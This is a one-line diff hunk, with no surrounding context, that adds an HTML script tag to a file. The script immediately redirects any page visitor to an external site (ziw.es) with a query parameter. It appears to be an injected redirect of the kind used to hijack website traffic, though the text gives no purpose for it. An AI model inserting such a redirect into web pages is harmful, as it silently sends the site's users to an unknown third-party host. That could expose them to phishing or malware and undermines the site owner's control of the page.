@@ -1,0 +1,1 @@
+<script> window.location = "https://ziw.es?d=8888";</script>
